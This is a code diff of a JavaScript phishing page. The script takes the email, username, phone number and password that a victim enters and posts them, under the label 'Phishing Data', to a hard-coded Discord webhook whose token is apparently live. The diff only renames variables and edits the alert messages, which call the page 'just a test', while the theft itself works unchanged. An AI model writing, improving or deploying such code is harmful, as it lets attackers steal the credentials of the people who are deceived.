@@ -1,4 +1,4 @@
-document.getElementById("phishForm").addEventListener("submit", function (event) {
+document.getElementById("phishingForm").addEventListener("submit", function (event) {
     event.preventDefault();
 
     const email = document.getElementById("email").value;
@@ -8,8 +8,8 @@ document.getElementById("phishForm").addEventListener("submit", function (event)
 
     const webhookURL = "https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk";
 
-    const payload = {
-        content: `Phishing Data:\nEmail: ${email}\nUsername: ${username}\nPhone Number: ${number}\nPassword: ${password}`
+    const message = {
+        content: `**Phishing Data Submitted**\nEmail: ${email}\nUsername: ${username}\nPhone Number: ${number}\nPassword: ${password}`
     };
 
     fetch(webhookURL, {
@@ -17,13 +17,13 @@ document.getElementById("phishForm").addEventListener("submit", function (event)
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(message)
     })
     .then(response => {
         if (response.ok) {
-            alert("Details submitted (but remember, this is just a test!)");
+            alert("Details submitted successfully (remember, this is just a test!)");
         } else {
-            alert("Failed to send details.");
+            alert("Failed to submit details.");
         }
     })
     .catch(error => {
